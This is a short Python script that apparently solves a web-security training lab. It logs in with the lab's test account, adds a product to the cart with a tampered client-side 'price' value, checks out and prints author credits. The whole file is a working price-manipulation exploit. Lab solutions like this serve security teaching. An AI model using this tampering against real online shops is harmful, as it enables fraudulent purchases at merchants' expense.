import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_my_account(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def send_target_product_to_cart(self):
        data = {
            'productId': 1,
            'redir': 'PRODUCT',
            'quantity': 1,
            'price': '100'
        }
        self.session.post(self.lab_url + 'cart', data=data)

    def buy_target_product(self):
        data = {
            'csrf': self.get_csrf_token('cart')
        }
        self.session.post(self.lab_url + 'cart/checkout', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.send_target_product_to_cart()
        self.buy_target_product()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
